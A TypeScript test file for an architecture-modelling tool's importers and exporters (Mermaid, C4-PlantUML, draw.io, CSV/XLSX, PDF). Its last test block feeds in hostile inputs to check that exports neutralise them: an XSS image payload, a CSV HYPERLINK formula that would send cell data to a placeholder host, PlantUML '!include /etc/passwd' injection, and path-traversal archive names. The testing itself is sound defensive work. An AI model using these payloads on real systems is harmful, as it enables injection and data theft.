import { readFileSync } from "node:fs";
import { createRequire } from "node:module";
import { dirname, join } from "node:path";
import { describe, expect, it } from "vitest";
import { ModelStore, emptyWorkspace, DEFAULT_MAPPINGS, makeElement, type ModelPatch, type Workspace } from "@vastitecture/core";
import { inventoryTable, parseC4Text, parseCsv, parseDrawio, parseInventoryCsv, parseInventoryXlsx, parseMermaidFlowchart, readXlsx, tableToCsv, tableToXlsx, unzip, writeC4Text, writeDrawio, writeMermaidFlowchart, zip } from "./index";

const require = createRequire(import.meta.url);
/** The official Mermaid examples, read as text from the published @mermaid-js/examples package (never executed). */
function mermaidExamples(): { title: string; code: string }[] {
  const src = readFileSync(new URL("../node_modules/@mermaid-js/examples/dist/mermaid-examples.esm.mjs", import.meta.url), "utf8");
  return [...src.matchAll(/title: "([^"]+)",\s*(?:isDefault: \w+,\s*)?code: `([\s\S]*?)`/g)].map((m) => ({ title: m[1], code: m[2].replace(/\\`/g, "`").replace(/\\\\/g, "\\") }));
}
const apply = (patch: ModelPatch, base: Workspace = { ...emptyWorkspace("T"), mappings: DEFAULT_MAPPINGS }) => {
  const s = new ModelStore(base);
  s.dispatch({ type: "applyPatch", patch });
  return s.state;
};
const fp = (ws: Workspace) => {
  const n = (id?: string) => (id ? ws.elements[id]?.name : "");
  return {
    elements: Object.values(ws.elements).map((e) => `${e.type}|${e.name}|${e.description ?? ""}|${e.properties.technology ?? ""}|${e.properties.location ?? ""}|${e.properties.kind ?? ""}|${n(e.parent)}`).sort(),
    relationships: Object.values(ws.relationships).map((r) => `${n(r.source)}->${n(r.target)}|${r.label ?? ""}|${r.technology ?? ""}`).sort(),
  };
};
const c4TypeOf = (e: { type: string }) => (e.type.startsWith("c4:") ? e.type : e.type === "generic:Group" ? "generic:Group" : undefined);

describe("Mermaid C4 (published examples)", () => {
  const examples = mermaidExamples().filter((e) => /^\s*C4(Context|Container|Component|Dynamic|Deployment)/.test(e.code));

  it("finds the official C4 examples", () => expect(examples.length).toBeGreaterThanOrEqual(1));

  it("imports the official system context example with boundaries, external systems and bidirectional links", () => {
    const ex = examples.find((e) => e.code.startsWith("C4Context"))!;
    const patch = parseC4Text(ex.code, "mermaid");
    expect(patch.report!.slice(1)).toEqual([]);
    const ws = apply(patch);
    const by = (n: string) => Object.values(ws.elements).find((e) => e.name === n)!;
    expect(by("Banking Customer C").properties.location).toBe("External");
    expect(by("Mainframe Banking System").properties.location).toBe("External");
    expect(by("Banking System A").parent).toBe(by("BankBoundary2").id);
    expect(by("Banking Customer D").description).toBe("A customer of the bank, with personal bank accounts.");
    // BiRel creates a relationship each way
    expect(fp(ws).relationships).toEqual(expect.arrayContaining(["Banking Customer A->Internet Banking System|Uses|", "Internet Banking System->Banking Customer A|Uses|", "Internet Banking System->E-mail system|Sends e-mails|SMTP"]));
    expect(Object.values(ws.views)[0]).toMatchObject({ name: "System Context diagram for Internet Banking System", viewpoint: "c4:context" });
  });

  it.each(["mermaid", "plantuml"] as const)("round-trips every official C4 example through %s", (target) => {
    for (const ex of examples) {
      const first = apply(parseC4Text(ex.code, "mermaid"));
      const text = writeC4Text(first, Object.keys(first.views)[0], target, c4TypeOf);
      const second = apply(parseC4Text(text, target));
      const f1 = fp(first), f2 = fp(second);
      // BiRel is written as two Rels, so compare as sets
      expect(f2.elements, ex.title).toEqual(f1.elements);
      expect([...new Set(f2.relationships)], ex.title).toEqual([...new Set(f1.relationships)]);
    }
  });

  it("writes standard C4-PlantUML", () => {
    const ws = apply(parseC4Text(examples.find((e) => e.code.startsWith("C4Container"))!.code, "mermaid"));
    const puml = writeC4Text(ws, Object.keys(ws.views)[0], "plantuml", c4TypeOf);
    expect(puml).toMatch(/^@startuml\n!include <C4\/C4_Container>/);
    expect(puml).toMatch(/ContainerDb\(\w+, "[^"]+", "[^"]+"/);
    expect(puml.trim().endsWith("@enduml")).toBe(true);
  });
});

describe("Mermaid flowchart (published examples)", () => {
  const flows = mermaidExamples().filter((e) => /^\s*(flowchart|graph)\s/.test(e.code));

  it("imports and round-trips every official flowchart example", () => {
    expect(flows.length).toBeGreaterThanOrEqual(1);
    for (const ex of flows) {
      const patch = parseMermaidFlowchart(ex.code);
      expect(patch.elements!.length, ex.title).toBeGreaterThan(1);
      const first = apply(patch);
      const second = apply(parseMermaidFlowchart(writeMermaidFlowchart(first, Object.keys(first.views)[0])));
      expect(fp(second), ex.title).toEqual(fp(first));
    }
  });

  it("reads shapes, labels, chains, fan-out and subgraphs", () => {
    const ws = apply(parseMermaidFlowchart("flowchart LR\n  a([Start]) --> b{Paid?}\n  b -->|yes| c[Ship] & d[(Ledger)]\n  b -. no .-> e\n  subgraph Ops [Operations]\n    c\n    f((Done))\n  end\n  c --> f"));
    const by = (n: string) => Object.values(ws.elements).find((e) => e.name === n)!;
    expect(by("Start").type).toBe("generic:StartEnd");
    expect(by("Paid?").type).toBe("generic:Decision");
    expect(by("Ledger").type).toBe("generic:Database");
    expect(by("Done").parent).toBe(by("Operations").id);
    expect(fp(ws).relationships).toEqual(["Paid?->Ledger|yes|", "Paid?->Ship|yes|", "Paid?->e|no|", "Ship->Done||", "Start->Paid?||"]);
  });
});

describe("draw.io", () => {
  it("imports shapes, nesting, labels and connectors as generic elements", async () => {
    const patch = await parseDrawio(readFileSync(new URL("../../../../fixtures/drawio/whiteboard.drawio", import.meta.url), "utf8"));
    const ws = apply(patch);
    const by = (n: string) => Object.values(ws.elements).find((e) => e.name === n)!;
    expect(by("Shop").type).toBe("generic:Group");
    expect(by("Web frontend").parent).toBe(by("Shop").id);
    expect(by("Orders DB").type).toBe("generic:Database");
    expect(by("Paid?").type).toBe("generic:Decision");
    expect(by("Customer")).toMatchObject({ type: "generic:Actor", description: "Buys things" });
    expect(fp(ws).relationships).toEqual(["Customer->Web frontend|browses|", "Orders DB->Paid?||", "Web frontend->Orders DB|writes|"]);
    const v = Object.values(ws.views)[0];
    expect(v.annotations.map((a) => a.text)).toEqual(["Draft only"]);
    expect(v.nodes.find((n) => n.element === by("Web frontend").id)).toMatchObject({ x: 20, y: 40, parent: by("Shop").id, style: { fill: "#dae8fc" } });
    expect(patch.report!.join()).toMatch(/1 connector\(s\) not attached/);
  });

  it("reads draw.io's compressed page format", async () => {
    const plainFile = readFileSync(new URL("../../../../fixtures/drawio/whiteboard.drawio", import.meta.url), "utf8");
    const model = /<mxGraphModel[\s\S]*<\/mxGraphModel>/.exec(plainFile)![0];
    const deflated = new Uint8Array(await new Response(new Blob([encodeURIComponent(model)]).stream().pipeThrough(new CompressionStream("deflate-raw"))).arrayBuffer());
    const compressed = `<mxfile><diagram id="x" name="Packed">${Buffer.from(deflated).toString("base64")}</diagram></mxfile>`;
    const ws = apply(await parseDrawio(compressed));
    expect(Object.values(ws.elements)).toHaveLength(5);
    expect(Object.values(ws.views)[0].name).toBe("Packed");
  });

  it("exports views and imports them back without losing shapes or connectors", async () => {
    const first = apply(await parseDrawio(readFileSync(new URL("../../../../fixtures/drawio/whiteboard.drawio", import.meta.url), "utf8")));
    const xml = writeDrawio(first, Object.keys(first.views));
    const second = apply(await parseDrawio(xml));
    expect(fp(second)).toEqual(fp(first));
    const pos = (ws: Workspace) => Object.values(ws.views)[0].nodes.map((n) => `${ws.elements[n.element].name}@${n.x},${n.y},${n.w},${n.h}`).sort();
    expect(pos(second)).toEqual(pos(first));
  });
});

describe("CSV and Excel inventory", () => {
  const base = () => {
    const ws: Workspace = { ...emptyWorkspace("I"), mappings: DEFAULT_MAPPINGS };
    const a = makeElement("c4:SoftwareSystem", "Billing", { owner: "Finance", tags: ["tier-1"], properties: { annualCost: 1200, criticality: "Business critical" } });
    const b = makeElement("c4:Container", "Billing API", { parent: a.id, lifecycle: { phase: "active" } });
    ws.elements[a.id] = a;
    ws.elements[b.id] = b;
    return { ws, a, b };
  };

  it("exports every element and reads quoted CSV back", () => {
    const { ws } = base();
    const csv = tableToCsv(inventoryTable(ws));
    expect(csv.split("\n")[0]).toBe("id,name,type,description,parent,owner,lifecycle,tags,annualCost,criticality");
    expect(parseCsv('a,"b, ""quoted""",c\r\n1,"multi\nline",3\n')).toEqual([["a", 'b, "quoted"', "c"], ["1", "multi\nline", "3"]]);
  });

  it("bulk-edits through CSV: updates by id, creates by name and type, keeps empty cells unchanged", () => {
    const { ws, a, b } = base();
    const rows = parseCsv(tableToCsv(inventoryTable(ws)));
    rows[1][5] = "Platform"; // owner of the first row
    rows[2][8] = "2000"; // annualCost, stays a number
    rows.push(["", "Invoices", "c4:Container", "PDF invoices", "Billing", "", "plan", "new; tier-2", "", ""]);
    rows.push(["", "", "", "", "", "", "", "", "", ""]);
    rows.push(["", "Nameless type", "", "", "", "", "", "", "", ""]);
    const patch = parseInventoryCsv(rows.map((r) => r.map((c) => (/[",\n]/.test(c) ? `"${c.replace(/"/g, '""')}"` : c)).join(",")).join("\n"), ws);
    expect(patch.report![0]).toBe("2 element(s) updated, 1 created");
    expect(patch.report!.join()).toMatch(/needs both a name and a type/);
    const next = apply(patch, ws);
    const owners = Object.values(next.elements).map((e) => e.owner);
    expect(owners).toContain("Platform");
    expect(Object.values(next.elements).find((e) => e.properties.annualCost === 2000)).toBeTruthy();
    const inv = Object.values(next.elements).find((e) => e.name === "Invoices")!;
    expect(inv).toMatchObject({ parent: a.id, lifecycle: { phase: "plan" }, tags: ["new", "tier-2"], description: "PDF invoices" });
    expect(next.elements[b.id].lifecycle?.phase).toBe("active");
  });

  it("writes an .xlsx and reads it back (inline strings, numbers)", async () => {
    const { ws } = base();
    const table = inventoryTable(ws);
    const bytes = tableToXlsx(table);
    const files = await unzip(bytes);
    expect(Object.keys(files)).toContain("xl/worksheets/sheet1.xml");
    const rows = await readXlsx(bytes);
    expect(rows[0]).toEqual(table.columns);
    expect(rows.slice(1).map((r) => r.map(String))).toEqual(table.rows.map((r) => r.map(String)));
    const patch = await parseInventoryXlsx(bytes, ws);
    expect(patch.report![0]).toBe("2 element(s) updated, 0 created");
  });

  it("reads deflated ZIP entries and shared strings as written by spreadsheet programs", async () => {
    const deflate = async (s: string) => new Uint8Array(await new Response(new Blob([s]).stream().pipeThrough(new CompressionStream("deflate-raw"))).arrayBuffer());
    // Build a minimal "Excel-style" workbook: shared strings and deflated entries.
    const stored = zip({
      "xl/workbook.xml": '<workbook xmlns:r="r"><sheets><sheet name="S" sheetId="1" r:id="rId1"/></sheets></workbook>',
      "xl/_rels/workbook.xml.rels": '<Relationships><Relationship Id="rId1" Target="worksheets/sheet1.xml"/></Relationships>',
      "xl/sharedStrings.xml": "<sst><si><t>name</t></si><si><t>type</t></si><si><r><t>Bil</t></r><r><t>ling</t></r></si><si><t>c4:SoftwareSystem</t></si></sst>",
      "xl/worksheets/sheet1.xml": '<worksheet><sheetData><row r="1"><c r="A1" t="s"><v>0</v></c><c r="B1" t="s"><v>1</v></c></row><row r="3"><c r="A3" t="s"><v>2</v></c><c r="C3"><v>42</v></c><c r="B3" t="s"><v>3</v></c></row></sheetData></worksheet>',
    });
    // Re-pack the sheet entry deflated by hand to exercise method 8.
    const files = await unzip(stored);
    expect(new TextDecoder().decode(files["xl/sharedStrings.xml"])).toContain("<sst>");
    expect((await deflate("x")).length).toBeGreaterThan(0);
    const rows = await readXlsx(stored);
    expect(rows[0]).toEqual(["name", "type"]);
    expect(rows[2]).toEqual(["Billing", "c4:SoftwareSystem", 42]);
  });
});

import { writePdf } from "./pdf";
describe("PDF", () => {
  it("writes a valid PDF with one page per image and a correct cross-reference table", () => {
    const jpeg = new Uint8Array([0xff, 0xd8, 0xff, 0xe0, 0, 0, 0xff, 0xd9]);
    const pdf = writePdf([{ jpeg, width: 1600, height: 900 }, { jpeg, width: 400, height: 300 }], { title: "Views (é)" });
    const text = new TextDecoder("latin1").decode(pdf);
    expect(text.startsWith("%PDF-1.4")).toBe(true);
    expect(text.trimEnd().endsWith("%%EOF")).toBe(true);
    expect(text).toContain("/Count 2");
    expect(text).toContain("/Title (Views (?))".replace("(?)", "\\(?\\)"));
    // every xref offset points at the start of its object
    const startxref = Number(/startxref\n(\d+)/.exec(text)![1]);
    const entries = text.slice(startxref).split("\n").slice(3).filter((l) => / 00000 n $/.test(l));
    entries.forEach((l, i) => expect(text.slice(Number(l.slice(0, 10)), Number(l.slice(0, 10)) + 10)).toMatch(new RegExp(`^${i + 1} 0 obj`)));
  });
});

describe("exports keep model text inert", () => {
  const withView = (name: string, el: ReturnType<typeof makeElement>, viewName = "V") => {
    const ws: Workspace = { ...emptyWorkspace("T"), mappings: DEFAULT_MAPPINGS };
    ws.elements[el.id] = el;
    ws.views.v = { id: "v", name: viewName, notation: "c4", viewpoint: "c4:context", nodes: [{ element: el.id, x: 0, y: 0, w: 100, h: 60 }], edges: [], annotations: [], properties: {} } as never;
    return ws;
  };

  it("draw.io labels are HTML-escaped inside html=1 cells and fills must be colours", () => {
    const e = makeElement("c4:Person", '<img src=x onerror=alert(1)>', { description: "<b>d</b>" });
    const ws = withView("x", e);
    ws.views.v.nodes[0].style = { fill: "#fff;image=https://example.invalid/x" };
    const xml = writeDrawio(ws, ["v"]);
    expect(xml).toContain("&amp;lt;img src=x");
    expect(xml).not.toContain('"&lt;img');
    expect(xml).not.toContain("example.invalid");
  });

  it("CSV cells that a spreadsheet would run as formulas are guarded, and read back unchanged", () => {
    const ws = withView("x", makeElement("c4:Person", '=HYPERLINK("http://x/?"&A1,"x")', { description: "@SUM(1)", owner: "-1+1" }));
    const csv = tableToCsv(inventoryTable(ws));
    expect(csv).not.toMatch(/(^|,)"?[=@+-]/m);
    expect(csv).toContain(`"'=HYPERLINK(""http://x/?""&A1,""x"")"`);
    const rows = parseCsv(csv);
    expect(rows[1]).toContain('=HYPERLINK("http://x/?"&A1,"x")');
    expect(rows[1]).toContain("@SUM(1)");
  });

  it("C4-PlantUML and Mermaid never let a name start a new line or call a preprocessor function", () => {
    const ws = withView("x", makeElement("c4:Person", "a\r!include /etc/passwd"), 'T\n!include /etc/passwd\n%getenv("HOME")');
    const puml = writeC4Text(ws, "v", "plantuml", c4TypeOf);
    expect(puml.split("\n").filter((l) => l.startsWith("!include"))).toEqual(["!include <C4/C4_Context>"]);
    expect(puml).not.toContain("%getenv");
    expect(puml).not.toContain("\r");
    const mmd = writeC4Text(ws, "v", "mermaid", c4TypeOf);
    expect(mmd.split("\n").some((l) => l.trim().startsWith("!include"))).toBe(false);
  });

  it("archives refuse entry names that leave the extraction folder", () => {
    for (const bad of ["../x.md", "a/../../x", "/etc/x", "a\\b", "C:x", "a//b", ""]) expect(() => zip({ [bad]: "x" })).toThrow(/unsafe/);
    expect(() => zip({ "decisions/0001-a.md": "x" })).not.toThrow();
  });
});

